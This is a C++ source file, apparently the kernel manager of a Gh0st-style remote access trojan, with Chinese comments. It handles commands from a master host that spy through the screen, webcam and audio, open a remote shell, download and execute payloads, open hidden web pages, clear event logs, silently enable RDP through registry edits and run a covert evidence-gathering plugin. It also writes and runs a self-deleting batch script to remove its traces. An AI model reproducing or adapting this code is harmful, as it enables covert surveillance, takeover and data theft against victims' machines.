// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "inject.h"
#include "SendLoginImfor.h"
#include "DDOS.h"
#include "macros.h"
#include "Log.h"
#include "./PluginManager/PluginServer.h"

//#include "WinSvc.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager *CKernelManager::m_pThis = NULL;	
CEvidence * CKernelManager::m_pObjEvidence = NULL;

int KillMBR()
{
	return 0;
}





CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	//TCHAR szModule [MAX_PATH];

	if (lpszServiceName != NULL)
	{
	//	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
	{
//		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		lstrcpy(m_strKillEvent, lpszKillEvent);
	}
	if (lpszMasterHost != NULL)
	{
	//	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		lstrcpy(m_strMasterHost, lpszMasterHost);
	}

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表始激活
	m_bIsActived = FALSE;
	// 创建一个监视键盘记录的线程
	// 键盘HOOK跟UNHOOK必须在同一个线程中

//	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);

	// 创建一个自动截屏的线程
  	//m_hThread[m_nThreadCount++] = 
 		//MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_AutoScren, this, 0,	NULL, TRUE);// 2011/05/26 yx

  	m_pObjEvidence = new CEvidence;
	//m_pObjEvidence->GetMiQiu();   //tsp2.0不需要这部分代码
//  	m_pObjEvidence->StartWork(); //-yx
//  	m_pObjEvidence->CSetEvent();

}


CKernelManager::~CKernelManager()
{
	TCHAR szModule [MAX_PATH];

	for(UINT i = 0; i < m_nThreadCount; i++)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		TerminateThread(m_hThread[i], -1);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		CloseHandle(m_hThread[i]);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	}
}

// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	static int dwTime=0;
	pcmd_plugin cmd=NULL;
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		LOG((LEVEL_INFO,"COMMAND_ACTIVED:%d\n",nSize));
 		{
			if ( lstrlen(CKeyboardManager::ConnPass) == 0 )//判断自身密码是否为空，空则跳过验证
			{
				if ( m_pClient->bSendLogin )//判断是否重复发送，测试的时候会上2次
				{
					sendLoginInfo_true( m_strServiceName, m_pClient, (GetTickCount() - CKeyboardManager::dwTickCount)/2 );
					m_pClient->bSendLogin = FALSE;
				}
				InterlockedExchange((LONG *)&m_bIsActived, TRUE);
			}
			else//不为空
			{
				char Pass[256] = {0};
				memcpy( Pass, lpBuffer + 1, 200 );
				if ( lstrcmpi( CKeyboardManager::ConnPass, Pass ) == 0 )//开始验证
				{
					if ( m_pClient->bSendLogin )//判断是否重复发送，测试的时候会上2次
					{
						sendLoginInfo_true( m_strServiceName, m_pClient, (GetTickCount() - CKeyboardManager::dwTickCount)/2 );
						m_pClient->bSendLogin = FALSE;
					}
					InterlockedExchange((LONG *)&m_bIsActived, TRUE);//符合，则激活
				}
				else
				{
					InterlockedExchange((LONG *)&m_bIsActived, FALSE);//不符合，则不激活
				}
			}
		}
		break;
	case COMMAND_LIST_DRIVE: // 文件管理
		LOG((LEVEL_INFO,"COMMAND_LIST_DRIVE:%d\n",nSize));
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, (LPVOID)m_pClient->m_Socket, 0, NULL, FALSE);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
		LOG((LEVEL_INFO,"COMMAND_SCREEN_SPY:%d\n",nSize));
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,(LPVOID)m_pClient->m_Socket, 0, NULL, TRUE);
		break;
	case COMMAND_WEBCAM: // 摄像头
		LOG((LEVEL_INFO,"COMMAND_WEBCAM:%d\n",nSize));
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,(LPVOID)m_pClient->m_Socket, 0, NULL, FALSE);
		break;
	case COMMAND_AUDIO: // 语音
		LOG((LEVEL_INFO,"COMMAND_AUDIO:%d\n",nSize));
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,(LPVOID)m_pClient->m_Socket, 0, NULL, FALSE);
		break;
	case COMMAND_SHELL: // 远程sehll
		LOG((LEVEL_INFO,"COMMAND_SHELL:%d\n",nSize));
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, (LPVOID)m_pClient->m_Socket, 0, NULL, TRUE);
		break;
	case COMMAND_KEYBOARD: 
		LOG((LEVEL_INFO,"COMMAND_KEYBOARD:%d\n",nSize));
	//2011/04/29 -yx

		//dwTime=0;
// 		if (!dwTime)
// 		{
// 			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, (LPVOID)(lpBuffer+1), 0,	NULL, TRUE); //2011/04/29 yx
// 			dwTime++;
// 		}
// 
// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,(LPVOID)m_pClient->m_Socket, 0, NULL, FALSE);
		break;
	case COMMAND_SYSTEM: 
		LOG((LEVEL_INFO,"COMMAND_SYSTEM:%d\n",nSize));
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,(LPVOID)m_pClient->m_Socket, 0, NULL, FALSE);
		break;
	case COMMAND_DOWN_EXEC: // 下载者
		LOG((LEVEL_INFO,"COMMAND_DOWN_EXEC:%d\n",nSize));
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,(LPVOID)(lpBuffer + 1), 0, NULL, TRUE);
		SleepEx(101,0); // 传递参数用
		break;
	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		LOG((LEVEL_INFO,"COMMAND_OPEN_URL_SHOW:%d\n",nSize));
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		LOG((LEVEL_INFO,"COMMAND_OPEN_URL_HIDE:%d\n",nSize));
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸载,
		{
			LOG((LEVEL_INFO,"COMMAND_REMOVE:%d\n",nSize));


			// liucw add 2013.07.25
			// //停止并删除插件
			GLOBAL_PLUGSERVER->SetSocket(m_pClient);
			GLOBAL_PLUGSERVER->OnPluginRemove(0,0);	

			// 卸载
			UnInstallService();
			break;
		}
		
	case COMMAND_CLEAN_EVENT: // 清除日志
		LOG((LEVEL_INFO,"COMMAND_CLEAN_EVENT:%d\n",nSize));
		{
			CleanEvent();
		}
		break;
	case COMMAND_SESSION:
		LOG((LEVEL_INFO,"COMMAND_SESSION:%d\n",nSize));
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // 改备注
		LOG((LEVEL_INFO,"COMMAND_RENAME_REMARK:%d\n",nSize));
		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER: // 更新服务端
		LOG((LEVEL_INFO,"COMMAND_UPDATE_SERVER:%d\n",nSize));
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包		
		((CManager*)this)->m_pClient->dwHeartTime=0;


		break;
	case COMMAND_DDOS:
		LOG((LEVEL_INFO,"COMMAND_DDOS:%d\n",nSize));
// 		if ( !Gobal_DDOS_Running )
// 		{
// 			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DDOS_Attacker, (LPVOID)lpBuffer, 0, NULL, TRUE);
// 			SleepEx(110,0);//传递参数用
// 		}
		break;
	case COMMAND_DDOS_STOP:
		LOG((LEVEL_INFO,"COMMAND_DDOS_STOP:%d\n",nSize));
		//DDOS_Stop();
		break;
	case COMMAND_HIT_HARD:
		LOG((LEVEL_INFO,"COMMAND_HIT_HARD:%d\n",nSize));
//		KillMBR();
		break;
	case COMMAND_OPEN_3389:
		LOG((LEVEL_INFO,"COMMAND_OPEN_3389:%d\n",nSize));
		Open3389();
		break;
	case COMMAND_CHAJIAN: // 下载插件
		LOG((LEVEL_INFO,"COMMAND_CHAJIAN:%d\n",nSize));
		//m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_CHAJIAN,(LPVOID)(lpBuffer + 1), 0, NULL, TRUE);
		SleepEx(110,0); // 传递参数用
		break;
	case COMMAND_SERECT_CFG: // 密取配置
		LOG((LEVEL_INFO,"COMMAND_SERECT_CFG:%d\n",nSize));
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SecretCfg,(LPVOID)(lpBuffer + 1), 0, NULL, TRUE);
		break;
	case COMMAND_CHAJIAN_FORMIQU: // 
		LOG((LEVEL_INFO,"COMMAND_CHAJIAN_FORMIQU:%d\n",nSize));

	//	printf((char*)(lpBuffer + 1));
		m_pObjEvidence->PassBackFileList((char*)(lpBuffer + 1),0);
		
		//		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_CHAJIAN_MIQU,(LPVOID)(lpBuffer + 1), 0, NULL, TRUE);
//		SleepEx(110,0); // 传递参数用
		break;

	case TOKEN_EVIDENCE_SREECN_ARG: // 下载插件
		LOG((LEVEL_INFO,"TOKEN_EVIDENCE_SREECN_ARG:%d\n",nSize));
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_CHAJIAN_MIQU,(LPVOID)(lpBuffer + 1), 0, NULL, TRUE);
		SleepEx(110,0); // 传递参数用
		break;

	case COMMAND_PLUGIN_REQUEST:	// 2.0插件下载	
		LOG((LEVEL_INFO,"收到COMMAND_PLUGIN_REQUEST,buff大小:%d(%x) .\n",nSize,nSize));

		cmd=new cmd_plugin;

		if (!cmd)
		{
			break;
		}
		cmd->Clientsocket=m_pClient;
		cmd->nSize=nSize-1;
		cmd->lpBuffer=lpBuffer+1;


		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Plugin_Request,(LPVOID)(cmd), 0, NULL, TRUE);
		break;

// 		{
// 			++lpBuffer;
// 			--nSize;		
// 			
// 			// 每次都应该设置一下，防止丢掉
// 			GLOBAL_PLUGSERVER->SetSocket(m_pClient);			
// 			int ret = GLOBAL_PLUGSERVER->OnPluginRequest(lpBuffer,nSize);
// 			if( ret != 0 )
// 			{
// 				LOG((LEVEL_WARNNING,"处理插件下载命令错,ret=%d",ret));
// 			}			
// 			GLOBAL_PLUGSERVER->ProcessConfig();
// 
// 			break;	
// 			
// 		}
	case COMMAND_ONLINE_ERROR:
		{

			LOG((LEVEL_INFO,"上线时发送错误.\n"));		
			m_pClient->Disconnect();
			break;
		
		}
	default:
		LOG((LEVEL_ERROR,"UNKNOWN COMMAND:%d(%x)\n",lpBuffer[0],lpBuffer[0]));
		break;
		
	}	
}



void DelSelfFile()
{
	CHAR szTempPath[MAX_PATH] = {0};
	int nRet = ::GetTempPathA(MAX_PATH, szTempPath);
	if (nRet <= 0)
	{
		return;
	}

	lstrcatA(szTempPath, ("unin.bat"));
	HANDLE hFileBat = ::CreateFileA(szTempPath, 
		GENERIC_WRITE | GENERIC_READ, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, 
		NULL);
	if (INVALID_HANDLE_VALUE == hFileBat)
	{
		return;
	}

// 	CHAR szSib[MAX_PATH];
// 	CHAR szSib_bak[MAX_PATH];
 	CHAR szMeedPath[MAX_PATH];
	//取得的目录结尾不带斜杠
	CHAR szWindowsPath[MAX_PATH] = {0};
	GetWindowsDirectoryA(szWindowsPath, MAX_PATH * sizeof(CHAR));

 	wsprintfA(szMeedPath,"%s\\meed\\",szWindowsPath);
// 	wsprintfA(szSib,"%s\\meed\\ctfmon.exe",szWindowsPath);
	

	//strcat(szWindowsPath,"\\meed\\SbieDll.dll.bak");


	TCHAR *szBat=""
		":loop\r\n"
		//"tasklist /nh|find /i \"ctfmon.exe\""
		//"if ERRORLEVEL 1 goto delfile"
		//"taskkill /f /im \"ctfmon.exe\"" 
		"if exist %s (\r\n"
		"del /q %s\r\n"
		"rd %s\r\n"
		"goto loop\r\n)\r\n"
	//	"del \"%s\"\r\n"
	//	"del \"%s_bak\"\r\n"
		"del %%0"
		;

	CHAR szBatContent[1024] = {0};

	::wsprintfA(szBatContent,szBat, szMeedPath,szMeedPath,szMeedPath);

//	::wsprintfA(szBatContent, (":Loop \r\n del \"%s\"\r\n if exist \"%s\" goto Loop \r\n del %%0"), lpszDstExeName, lpszDstExeName);
	DWORD dwWrite = 0;
	BOOL bRet = ::WriteFile(hFileBat, szBatContent, lstrlenA(szBatContent), &dwWrite, NULL);
	::CloseHandle(hFileBat);
	if (bRet && dwWrite == lstrlenA(szBatContent))
	{
		::WinExec(szTempPath, SW_HIDE);
	}

	return;
}

void CKernelManager::UnInstallService()
{

	char	strRandomFile[MAX_PATH];
	char	szTempPath[MAX_PATH];
	GetTempPathA(MAX_PATH,szTempPath);
	wsprintf(strRandomFile, "%s%d.bak",szTempPath, GetTickCount());
	
	//删除注册表




	//取得的目录结尾不带斜杠
	CHAR szWindowsPath[MAX_PATH] = {0};
	GetWindowsDirectoryA(szWindowsPath, MAX_PATH * sizeof(CHAR));
	strcat(szWindowsPath,"\\meed\\SbieDll.dll.bak");
	MoveFileEx(szWindowsPath,strRandomFile,MOVEFILE_DELAY_UNTIL_REBOOT);


	//停止插件工作
	StopAutoScreen();


// 	//安装后的目标文件
// 	CHAR szObjInstallName[MAX_PATH] = {0};
// 	wsprintfA(szObjInstallName, "%s\\%s", szWindowsPath, "meed\\svchost.exe");
// 
// 	CKeyboardManager::MyMoveFile(szObjInstallName, strRandomFile);

	RegDeleteKey(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\option");
	RegDeleteKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Microsoft\\Windows\\CurrentVersion\\Run\\Netman");

	DelSelfFile();

	HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,FALSE,TEXT("nimdkeikd"));
	if (hEvent)
	{
		SetEvent(hEvent);
		CloseHandle(hEvent);
		Sleep(2000);
	}

	ExitProcess(0);

}


// void CKernelManager::UnInstallService_old()
// {
// 	TCHAR szModule [MAX_PATH];
// //	if ( CKeyboardManager::hProtect != NULL ) TerminateThread( CKeyboardManager::hProtect, 0 );
// //	if ( CKeyboardManager::hFile != NULL ) CloseHandle(CKeyboardManager::hFile);
// 	char	strServiceDll[MAX_PATH];
// 	char	strRandomFile[MAX_PATH];
// 
// 	CKeyboardManager::MyGetModuleFileName( CKeyboardManager::g_hInstance, strServiceDll, sizeof(strServiceDll) );
// 
// 	// 装文件随机改名，重启时删除
// 	wsprintf(strRandomFile, "%d.bak", GetTickCount());
// 	CKeyboardManager::MyMoveFile(strServiceDll, strRandomFile);
// 	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
// 
// 	// 删除离线记录文件
// 	char	strRecordFile[MAX_PATH];
// 	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
// 	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
// 	CKeyboardManager::Mylstrcat(strRecordFile, "\\desktop.inf");
// 	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
// 	DeleteFile(strRecordFile);
// 	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
// //	RemoveService(m_strServiceName);
// 
// 	if ( m_dwServiceType != 0x120 )  // owner的远程删除，不能自己停止自己删除,远程线程删除
// 	{
// 		InjectRemoveService("winlogon.exe", m_strServiceName);
// 	}
// 	else // shared进程的服务,可以删除自己
// 	{
// 		RemoveService(m_strServiceName);
// 	}
// 
// 	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
// 	// 所有操作完成后，通知主线程可以退出
// 	CreateEvent( NULL, TRUE, FALSE, m_strKillEvent );
// 	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
// 
// 	//删除安装文件
// 	wsprintf(strRandomFile, "%d.bak", GetTickCount());
// 
// 	//取得的目录结尾不带斜杠
// 	CHAR szWindowsPath[MAX_PATH] = {0};
// 	GetWindowsDirectoryA(szWindowsPath, MAX_PATH * sizeof(CHAR));
// 
// 	//安装后的目标文件
// 	CHAR szObjInstallName[MAX_PATH] = {0};
// 	wsprintfA(szObjInstallName, "%s\\%s", szWindowsPath, "meed\\ctfmon.exe");
// 
// 	CKeyboardManager::MyMoveFile(szObjInstallName, strRandomFile);
// 	DeleteFile(strRandomFile);
// }

BOOL CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

void CKernelManager::Open3389()
{
    DWORD Port = 3389;
    CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache","Enabled","0");
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer","EnableAdminTSRemote",0x00000001);
    CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ShutdownWithoutLogon","0");
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","TSEnabled",0x00000001);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermDD","Start",0x00000002);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermService","Start",0x00000002);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000001);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp","PortNumber",Port);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp","PortNumber",Port);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp","PortNumber",Port);
    CreateStringReg(HKEY_USERS,".DEFAULT\\Keyboard Layout\\Toggle","Hotkey","2");
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000000);
    return;
}

void CKernelManager::CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
    HKEY hKey;
    //打开注册表键，不存在则创建它
    long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
    {
        return;
    }
    //修改注册表键值，没有则创建它
    lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	if (lRet!=ERROR_SUCCESS)
	{
		return;
	}
    RegCloseKey(hKey);
}

//用于修改数字类型键值
void CKernelManager::MyCreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data)
{
    HKEY hKey;
    //打开注册表键，不存在则创建它
    long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
    {
        return;
    }
    DWORD dwSize=sizeof(DWORD);
    //修改注册表键值，没有则创建它
    lRet=RegSetValueEx(hKey,ValueName,0,REG_DWORD,(BYTE*)&Data,dwSize);
	if (lRet!=ERROR_SUCCESS)
	{
		return;
	}
    RegCloseKey(hKey);
}


CKernelManager* CKernelManager::CreateKernelManager(CClientSocket *pClient , LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
													LPCTSTR lpszMasterHost, UINT nMasterPort)
{
	if (NULL == m_pThis)
	{
		m_pThis = new CKernelManager(pClient, lpszServiceName, dwServiceType, lpszKillEvent, lpszMasterHost, nMasterPort);
	}

	return m_pThis;
}

void CKernelManager::DestoryInstance()
{
	if (NULL != m_pThis)
	{
		delete m_pThis;
		m_pThis = NULL;
	}
}